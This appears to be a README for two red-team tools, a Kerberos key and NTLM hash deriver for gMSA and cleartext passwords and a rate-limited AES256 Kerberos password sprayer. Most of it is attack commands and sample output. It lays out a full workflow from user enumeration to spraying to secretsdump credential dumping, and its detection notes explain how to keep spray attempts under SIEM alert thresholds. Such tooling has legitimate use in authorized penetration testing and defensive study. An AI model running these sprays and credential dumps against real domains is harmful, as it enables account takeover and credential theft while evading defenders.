# kerbcred-tools

A pair of OPSEC-safe credential derivation and Kerberos spraying tools. No RC4 on the wire, no NTLM, no plaintext passwords passed to external tools.

---

## Tools

| Script | Purpose |
|---|---|
| `passtohash.py` | Derive Kerberos AES-256 / AES-128 keys and NTLM hash from a gMSA blob or cleartext password |
| `aesspraying.py` | OPSEC-safe AES256 Kerberos password sprayer — rate-limited, no RC4 downgrade |

---

## Requirements

```bash
pip install impacket
```

`aesspraying.py` additionally requires `impacket-getTGT` in PATH (included with impacket).

---

# passtohash.py

Derive Kerberos **AES-256 / AES-128** keys and **NTLM** hash from:

- a bloodyAD `msDS-ManagedPassword` blob (`-b64`) — gMSA accounts
- a cleartext password (`-p`) — any account
- a password read from file (`-pfile`) — avoids shell expansion of special chars

Salt format is auto-detected from the account name — machine/gMSA accounts (`$` suffix) get the `host` salt; regular users get the standard user salt.

## Usage

```
python3 passtohash.py -b64 <B64_BLOB>  -a <sAMAccountName> -d <domain> [options]
python3 passtohash.py -p   <cleartext> -a <sAMAccountName> -d <domain> [options]
python3 passtohash.py -pfile <PATH>    -a <sAMAccountName> -d <domain> [options]
```

### Arguments

| Flag | Description |
|---|---|
| `-b64 <blob>` | Base64-encoded `msDS-ManagedPassword` blob from bloodyAD |
| `-p <password>` | Cleartext password string |
| `-pfile <PATH>` | Read cleartext from file — safe for passwords containing backticks, `$`, quotes |
| `-a <sAMAccountName>` | Account name — **include `$`** for machine/gMSA accounts |
| `-d <domain>` | FQDN of the domain (e.g. `target.local`) |

### Options

| Flag | Description |
|---|---|
| `--file`, `-f` | Treat `-b64` value as a file path |
| `--verbose`, `-v` | Print raw password hex, byte lengths, blob size |
| `--hashcat` | Bare output for piping into hashcat/john |

## Examples

### gMSA blob

```bash
python3 passtohash.py -b64 'eFkb...' -a 'LOCAL_gMSA$' -d 'local.htb'
```

```
[*] Salt      : LOCAL.HTBhostlocal_gmsa.local.htb
[*] NTLM      : <ntlm_hash>

LOCAL_gMSA$:aes256-cts-hmac-sha1-96:4a3b...
LOCAL_gMSA$:aes128-cts-hmac-sha1-96:9c1f...
```

### Cleartext — machine account

```bash
python3 passtohash.py -p 'S3cr3tP@ss!' -a 'machine1$' -d 'local.htb'
```

### Cleartext — user account

```bash
python3 passtohash.py -p 'S3cr3tP@ss!' -a 'jdoe' -d 'local.htb'
```

### Password from file (special chars safe)

Use `-pfile` whenever the password contains shell-sensitive characters — backticks, `$`, quotes. Python reads the file directly with no shell involvement.

```bash
# Retrieve a complex password (e.g. from LAPS dump or PSReadLine history)
echo 'Wc^ZE(L9_ou&`uM5' > pass.txt

python3 passtohash.py -pfile pass.txt -a 'employee01$' -d 'corp.local'
```

Using `"$(cat pass.txt)"` silently corrupts passwords that contain `` ` `` or `$VARNAME` — the NTLM output looks valid but is wrong.

### Pipe into hashcat

```bash
python3 passtohash.py -b64 'eFkb...' -a 'LOCAL_gMSA$' -d 'local.htb' --hashcat >> hashes.txt
```

## Salt logic

| Account type | Condition | Salt format | Example |
|---|---|---|---|
| Machine / gMSA | ends in `$` | `DOMAIN.UPPERhostaccount.domain.lower` | `LOCAL.HTBhostmachine1.local.htb` |
| User | no `$` | `DOMAIN.UPPERusername` | `LOCAL.HTBjdoe` |

Use `--verbose` to confirm the salt if you get `KRB_AP_ERR_MODIFIED`.

## gMSA workflow

```bash
# 1. Read msDS-ManagedPassword
bloodyAD --host dc01.local.htb -d local.htb -u user -p pass get object 'LOCAL_gMSA$' --attr msDS-ManagedPassword

# 2. Derive keys
python3 passtohash.py -b64 'eFkb...' -a 'LOCAL_gMSA$' -d 'local.htb'

# 3. PTH
secretsdump.py -hashes :ntlmhashhere... 'local.htb/LOCAL_gMSA$@dc01.local.htb'

# 4. PTT (avoids RC4 downgrade)
getTGT.py -aesKey 4a3b... 'local.htb/LOCAL_gMSA$'
```

## Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `KRB_AP_ERR_MODIFIED` | Wrong salt | Check with `--verbose`; verify `userPrincipalName` |
| `md4` ValueError | OpenSSL 3 removed MD4 | `pip install pycryptodome` or use built-in fallback |
| Blob parse error | Tool dumped raw password bytes without MSDS header | Script detects `version != 1` and falls back |
| Wrong NTLM from cleartext | Shell expansion corrupted password | Use `-pfile` instead of `-p "$(cat ...)"` |

---

# aesspraying.py

OPSEC-safe Kerberos password sprayer. Derives AES256 keys from cleartext passwords and requests TGTs via `impacket-getTGT` — **no RC4, no NTLM on the wire**. Rate-limited to stay under detection threshold.

## Why AES256 spraying

Standard spraying tools send either NTLM auth (Event 4776) or RC4-encrypted Kerberos AS-REQ (Event 4768 with etype 23 — a known detection signal). AES256 pre-auth (etype 18) is indistinguishable from a normal user login. Combined with rate limiting, this keeps spray attempts within acceptable noise thresholds discussed with red teamers and blue teamers alike: **1-2 failed logons per account per 5 minutes** is generally below automated alert thresholds.

## Usage

```
python3 aesspraying.py -p   <password>  -a <sAMAccountName> -d <domain> --dc-ip <IP> [options]
python3 aesspraying.py -P   <passlist>  -A <userlist>       -d <domain> --dc-ip <IP> [options]
python3 aesspraying.py -pfile <PATH>    -a <sAMAccountName> -d <domain> --dc-ip <IP> [options]
```

### Required arguments

| Flag | Description |
|---|---|
| `-p <password>` | Single cleartext password |
| `-pfile <PATH>` | Read single password from file (safe for special chars) |
| `-P <passlist>` | File containing one password per line |
| `-a <sAMAccountName>` | Single target account |
| `-A <userlist>` | File containing one sAMAccountName per line |
| `-d <domain>` | FQDN of the target domain |
| `--dc-ip <IP>` | IP of the domain controller |

### Options

| Flag | Description |
|---|---|
| `-t <MINUTES>` | Wait between attempts in minutes (default: 5) |
| `--proxychains` | Prefix getTGT calls with `proxychains -q` |
| `--no-stop` | Continue spraying a user even after a successful hit |
| `--output-dir <DIR>` | Save ccache files here (default: current dir) |
| `--verbose` | Print derived AES256 key for each attempt |

## Examples

### Single account, single password

```bash
python3 aesspraying.py -p "S3cr3tP@ssw0rd" -a svcaccount -d target.local --dc-ip 10.10.10.1
```

### Userlist vs passwordlist — rate limited

```bash
python3 aesspraying.py -P passwords.txt -A users.txt -d target.local --dc-ip 10.10.10.1 -t 5
```

### Over SOCKS via proxychains

```bash
python3 aesspraying.py -P passwords.txt -A users.txt -d target.local --dc-ip 10.10.10.1 -t 5 --proxychains
```

### Password with special chars (from file)

```bash
python3 aesspraying.py -pfile pass.txt -a svcaccount -d target.local --dc-ip 10.10.10.1
```

## Output

```
[*] Target domain : target.local
[*] DC IP         : 10.10.10.1
[*] Users         : 100
[*] Passwords     : 2
[*] Wait          : 5.0m between attempts
[*] Proxychains   : True
[*] Output dir    : .

[ TRY  ] svcaccount@target.local — 'Password@123'  (1/200)
[ FAIL ] svcaccount@target.local
[ WAIT ] sleeping 5.0m ...
[ TRY  ] svcaccount@target.local — "S3cr3tP@ssw0rd"  (2/200)
[  OK  ] svcaccount@target.local — TGT saved → svcaccount@target.local.ccache

──────────────────────────────────────────────────────────────
  Spray complete — 1 hit(s) of 100 user(s)
──────────────────────────────────────────────────────────────

  [+] svcaccount
      Password : "S3cr3tP@ssw0rd"
      AES256   : aes256keyhere...
      ccache   : ./svcaccount@target.local.ccache
```

## Spray logic

- **Outer loop** — passwords (one password tested against all users before moving to next)
- **Inner loop** — users
- Machine accounts (`$` suffix) are **automatically filtered out** — spraying `MSP-DC01$` with a user password makes no sense and generates noise
- On success the ccache is saved immediately and that user is skipped for remaining passwords (unless `--no-stop`)
- Lockout detection: `KDC_ERR_CLIENT_REVOKED` stops spraying that user entirely
- Non-existent accounts: `KDC_ERR_C_PRINCIPAL_UNKNOWN` skips silently

## Workflow

```bash
# 1. Enumerate users (OPSEC-safe — anonymous rootDSE → getST → bloodyAD)
proxychains -q bloodyAD -d TARGET.LOCAL --host dc01.target.local -k kdc=10.10.10.1 realmc=TARGET.LOCAL -- get search --filter "objectClass=user" --attr sAMAccountName | grep "sAMAccountName:" | sed 's/sAMAccountName: //' | grep -v '\$$' > users.txt

# 2. Spray
python3 aesspraying.py -P passwords.txt -A users.txt -d target.local --dc-ip 10.10.10.1 -t 5 --proxychains

# 3. Use the ccache
export KRB5CCNAME=$(pwd)/svcaccount@target.local.ccache
proxychains impacket-secretsdump -k -no-pass target.local/svcaccount@dc01.target.local
```

## Detection notes

| Action | Event ID | Notes |
|---|---|---|
| Failed AES TGT request | 4771 | etype 18 — blends with normal logins |
| Successful TGT | 4768 | etype 18, normal |
| NTLM spray (what others do) | 4776 | etype 23 — flagged by most SIEMs |

1-2 failed 4771 events per account per 5 minutes is generally within acceptable noise. Bulk 4771 events from a single source IP is not.

---

## References

- [MS-ADTS §2.2.37 — MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9c8-0c8b7ddc87f8)
- [MS-KILE §3.1.1.2 — Kerberos Principal Names](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/b4af186e-b2ff-43f9-b18e-eedb399f4a37)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [impacket](https://github.com/fortra/impacket)
